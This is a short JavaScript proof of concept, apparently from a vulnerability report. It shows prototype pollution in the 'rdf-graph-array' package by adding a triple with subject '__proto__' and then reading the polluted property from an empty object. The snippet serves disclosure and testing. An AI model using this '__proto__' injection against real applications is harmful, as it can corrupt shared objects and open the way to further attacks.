var Graph = require("rdf-graph-array").Graph;
var g = new Graph();
g.add({
  graph: "foo",
  subject: "__proto__",
  predicate: "toString",
  object: "JHU",
});
console.log({}.foo);
